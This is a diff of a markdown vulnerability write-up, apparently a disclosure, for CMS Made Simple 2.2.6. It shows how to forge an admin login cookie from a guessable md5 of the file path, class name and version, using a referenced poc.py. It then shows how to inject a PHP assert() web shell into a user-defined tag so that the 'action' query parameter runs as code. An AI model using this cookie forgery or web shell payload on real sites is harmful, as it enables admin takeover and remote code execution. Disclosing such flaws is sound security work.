@@ -133,8 +133,11 @@ line 106 gets data from ```$_COOKIE[$this->_loginkey]```
 
 ```$this->_loginkey```  comes from  ```md5(__FILE__.__CLASS__.CMS_VERSION)```
 the admin dashboard user can get the value in the cookie after logging in, and can also guess it directly
+
 ```__FILE__```  -->```” absolute path”\lib\classes\internal\class.LoginOperations.php```(**refer to Appendix 1**)
+
 ```__CLASS__```  -->```CMSMS\LoginOperations```(fixed value)
+
 ```CMS_VERSION```  -->```2.2.6```(fixed value,or 2.2.5/2.2.4/...)
 
 ![19.png](./img/19.png)
@@ -164,7 +167,9 @@ python poc.py
 ![22.png](./img/22.png)
 
 open /admin/index.php with the browser corresponding to user_agent in poc and jump to /admin/login.php
+
 clear all cookies
+
 then add the cookies generated  by poc
 
 -->```733200e27b06fbee203116934285f533```
@@ -220,8 +225,8 @@ select a tag to edit and add as follows
 
 ![31.png](./img/31.png)
 
-```
-}if(isset($_GET['action'])) @assert($_GET['action']);/*```
+
+}if(isset($_GET['action'])) @assert($_GET['action']);/*
 
 then visit /index.php?action=phpinfo()
 the variable ```action``` is the command to be executed
